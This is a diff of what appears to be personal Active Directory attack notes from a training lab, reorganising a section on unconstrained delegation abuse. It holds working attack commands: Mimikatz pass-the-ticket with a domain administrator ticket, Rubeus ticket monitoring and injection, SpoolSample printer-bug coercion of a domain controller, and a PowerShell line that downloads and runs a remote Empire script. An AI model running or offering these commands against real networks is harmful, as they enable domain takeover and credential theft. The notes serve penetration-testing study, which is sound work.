@@ -780,18 +780,6 @@ We can then reuse the DA token:
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 ```
 
-* * *
-
-#### Rubeus
-```Get-NetComputer -UnConstrained```
-
-```
-Rubeus triage
-Rubeus monitor /interval:5 /filteruser:dc01$ /nowrap
-SpoolSample DC01 WebSrv_ownd
-Rubeus ptt /ticket:
-```
-* * *
 
 # Printer bug - why wait when you can spool?
 https://github.com/leechristensen/SpoolSample
@@ -804,7 +792,20 @@ compiled binary available here - [Tool dump](https://github.com/conma293/mvp)
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")
 ```
 
-* * * 
+```Invoke-SpoolSample DC01 WebSrv_ownd```
+
+* * *
+
+#### Rubeus
+```Get-NetComputer -UnConstrained```
+
+```
+Rubeus triage
+Rubeus monitor /interval:5 /filteruser:dc01$ /nowrap
+SpoolSample DC01 WebSrv_ownd
+Rubeus ptt /ticket:
+```
+* * *
 
 # Constrained Delegation
 This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine *msds-allowedtodelegateto* property.
